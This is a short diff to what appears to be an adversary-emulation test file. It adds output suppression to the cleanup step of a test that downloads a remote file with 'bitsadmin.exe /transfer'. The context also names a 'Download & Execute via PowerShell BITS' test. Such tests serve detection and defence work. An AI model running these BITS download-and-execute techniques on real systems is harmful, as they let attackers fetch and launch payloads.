@@ -24,7 +24,7 @@ atomic_tests:
     command: |
       bitsadmin.exe /transfer /Download /priority Foreground #{remote_file} #{local_file}
     cleanup_command: |
-      del #{local_file}
+      del #{local_file} >nul 2>&1
 
 - name: Download & Execute via PowerShell BITS
   description: |
